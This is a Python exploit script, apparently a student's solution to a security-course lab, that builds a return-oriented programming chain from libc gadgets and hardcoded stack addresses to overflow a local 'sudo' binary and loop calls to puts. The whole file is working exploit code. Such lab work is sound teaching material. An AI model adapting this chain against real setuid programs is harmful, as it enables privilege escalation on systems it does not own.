import os, sys

import assemble, struct
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():

	offset = 'a' * 66

	start_of_libc = 0xb7c3a750
	gs = GadgetSearch('libc.bin', start_of_libc)

	pop_ebp_address = gs.find('POP ebp').decode("hex")[::-1]

	puts_address = 0x08048580

	my_id = '203246509'
	string = get_string (my_id)

	#skip_gadget = gs.find('ADD esp, 4').decode("hex")[::-1]
	skip_gadget = gs.find('POP edx').decode("hex")[::-1]

	pop_esp_address = gs.find('POP esp').decode("hex")[::-1]

	start_of_buf = 0xbfffe01a

	#Load the address of puts into ebp
	result = offset 

	result += pop_ebp_address
	result += struct.pack('<I',puts_address)


	address_to_jump_loop = start_of_buf + len(result)
	


	#jump to puts
	result += struct.pack('<I',puts_address)  


	#Address of a gadget to "skip" 4 bytes on the stack
	result += skip_gadget 


	#Address of your string
	start_of_string = start_of_buf + len (result) + 12
	result += struct.pack('<I',start_of_string) 


	# Loop back to the second step (b) Jump to puts)

	result += pop_esp_address
	
	result += struct.pack('<I',address_to_jump_loop)

	result += string #put the string on the stack

	return result
    #raise NotImplementedError()


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())
	#os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', get_arg())

if __name__ == '__main__':
    main(sys.argv)
